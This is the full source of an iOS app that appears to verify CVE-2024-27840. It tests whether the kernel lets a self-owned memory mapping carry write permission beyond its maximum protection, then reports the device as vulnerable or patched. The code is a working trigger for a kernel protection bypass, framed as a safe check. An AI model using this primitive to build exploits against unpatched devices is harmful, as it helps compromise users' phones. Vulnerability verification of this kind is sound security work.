/*
 * CVE-2024-27840 Userspace Verification App
 *
 * SAFE: Only maps this process's own memory with cur>max.
 * Cannot touch kernel memory. Cannot cause data loss.
 * Cannot trigger kernel panic. Worst case: app crashes (handled).
 *
 * Tests whether vm_map_enter_mem_object_helper() validates
 * that cur_protection is a subset of max_protection.
 *
 * Pre-iOS 17.5: write through cur>max mapping succeeds (VULNERABLE)
 * iOS 17.5+: cur_protection clamped, write faults (PATCHED)
 */

#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <signal.h>
#import <setjmp.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t,
    int, mem_entry_name_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

static sigjmp_buf jump_buf;
static volatile sig_atomic_t got_signal = 0;

static void fault_handler(int sig) {
    got_signal = sig;
    siglongjmp(jump_buf, 1);
}

static NSString *run_test(void) {
    NSMutableString *log = [NSMutableString string];
    kern_return_t kr;
    mach_port_t task = mach_task_self();

    [log appendString:@"=== CVE-2024-27840 Test ===\n"];
    [log appendFormat:@"Testing cur_protection > max_protection bypass\n\n"];

    mach_vm_address_t src_addr = 0;
    mach_vm_size_t page_size = vm_page_size;

    kr = mach_vm_allocate(task, &src_addr, page_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [log appendFormat:@"FAIL: mach_vm_allocate: %s\n", mach_error_string(kr)];
        return log;
    }

    memset((void *)src_addr, 'A', page_size);
    [log appendFormat:@"[1] Allocated page at 0x%llx (size=0x%llx)\n",
     (uint64_t)src_addr, (uint64_t)page_size];

    memory_object_size_t entry_size = page_size;
    mach_port_t mem_entry = MACH_PORT_NULL;

    kr = mach_make_memory_entry_64(
        task, &entry_size, src_addr,
        VM_PROT_READ | VM_PROT_WRITE, &mem_entry, MACH_PORT_NULL
    );
    if (kr != KERN_SUCCESS) {
        [log appendFormat:@"FAIL: mach_make_memory_entry_64: %s\n", mach_error_string(kr)];
        mach_vm_deallocate(task, src_addr, page_size);
        return log;
    }
    [log appendFormat:@"[2] Memory entry created (entry_prot=RW)\n"];

    mach_vm_address_t map_addr = 0;

    kr = mach_vm_map(
        task, &map_addr, page_size,
        0, VM_FLAGS_ANYWHERE,
        mem_entry, 0, FALSE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_PROT_READ,
        VM_INHERIT_NONE
    );

    if (kr != KERN_SUCCESS) {
        [log appendFormat:@"[3] mach_vm_map REJECTED: %s\n", mach_error_string(kr)];
        [log appendFormat:@"\nRESULT: Kernel rejects cur>max at map level\n"];
        mach_port_deallocate(task, mem_entry);
        mach_vm_deallocate(task, src_addr, page_size);
        return log;
    }

    [log appendFormat:@"[3] mach_vm_map ACCEPTED cur=RW, max=R\n"];
    [log appendFormat:@"    Mapped at 0x%llx\n", (uint64_t)map_addr];

    char readbuf = *(volatile char *)map_addr;
    [log appendFormat:@"[4] Read through mapping: 0x%02x ('%c')\n",
     (unsigned char)readbuf, readbuf];

    struct sigaction sa = {0};
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);

    [log appendFormat:@"[5] Attempting write...\n"];

    int write_succeeded = 0;
    char verify = 0;

    if (sigsetjmp(jump_buf, 1) == 0) {
        *(volatile char *)map_addr = 'B';
        verify = *(volatile char *)src_addr;
        write_succeeded = 1;
    }

    sa.sa_handler = SIG_DFL;
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);

    if (write_succeeded) {
        [log appendFormat:@"[5] WRITE SUCCEEDED\n"];
        [log appendFormat:@"    Original page reads: '%c'\n", verify];
        if (verify == 'B') {
            [log appendFormat:@"\n=============================\n"];
            [log appendFormat:@"VULNERABLE: CVE-2024-27840\n"];
            [log appendFormat:@"cur>max bypass is functional\n"];
            [log appendFormat:@"=============================\n"];
        } else {
            [log appendFormat:@"\nWrite went to CoW copy\n"];
        }
    } else {
        [log appendFormat:@"[5] Write FAULTED (signal %d)\n", got_signal];
        [log appendFormat:@"\n=============================\n"];
        [log appendFormat:@"PATCHED: cur clamped to max\n"];
        [log appendFormat:@"=============================\n"];
    }

    kr = mach_vm_protect(task, map_addr, page_size, FALSE,
                          VM_PROT_READ | VM_PROT_WRITE);
    [log appendFormat:@"\n[6] mach_vm_protect(RW) on max=R: %s\n",
     kr == KERN_SUCCESS ? "SUCCEEDED" : mach_error_string(kr)];

    mach_vm_deallocate(task, map_addr, page_size);
    mach_port_deallocate(task, mem_entry);
    mach_vm_deallocate(task, src_addr, page_size);

    [log appendFormat:@"\nSource: xnu-10063.101.15 vm_map.c:4172\n"];
    [log appendFormat:@"Fix:    xnu-10063.121.3  vm_map.c:4196\n"];

    return log;
}

@interface ViewController : UIViewController
@property (nonatomic, strong) UITextView *textView;
@property (nonatomic, strong) UIButton *runButton;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];

    self.textView = [[UITextView alloc] initWithFrame:CGRectZero];
    self.textView.translatesAutoresizingMaskIntoConstraints = NO;
    self.textView.editable = NO;
    self.textView.backgroundColor = [UIColor blackColor];
    self.textView.textColor = [UIColor greenColor];
    self.textView.font = [UIFont fontWithName:@"Menlo" size:12];
    self.textView.text = @"CVE-2024-27840 Test\nTap Run to start.\n\nThis test is SAFE:\n- Maps only this app's own memory\n- Cannot touch kernel memory\n- Cannot cause data loss\n- Worst case: handled crash\n";
    [self.view addSubview:self.textView];

    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.runButton setTitle:@"Run Test" forState:UIControlStateNormal];
    [self.runButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.runButton.backgroundColor = [UIColor colorWithRed:0.2 green:0.5 blue:0.2 alpha:1.0];
    self.runButton.layer.cornerRadius = 8;
    self.runButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    [self.runButton addTarget:self action:@selector(runTest) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.runButton];

    [NSLayoutConstraint activateConstraints:@[
        [self.textView.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:10],
        [self.textView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:10],
        [self.textView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-10],
        [self.textView.bottomAnchor constraintEqualToAnchor:self.runButton.topAnchor constant:-10],

        [self.runButton.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:40],
        [self.runButton.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-40],
        [self.runButton.bottomAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.bottomAnchor constant:-20],
        [self.runButton.heightAnchor constraintEqualToConstant:50],
    ]];
}

- (void)runTest {
    self.runButton.enabled = NO;
    [self.runButton setTitle:@"Running..." forState:UIControlStateDisabled];
    self.textView.text = @"Running test...\n";

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *result = run_test();
        dispatch_async(dispatch_get_main_queue(), ^{
            self.textView.text = result;
            self.runButton.enabled = YES;
        });
    });
}

@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[ViewController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
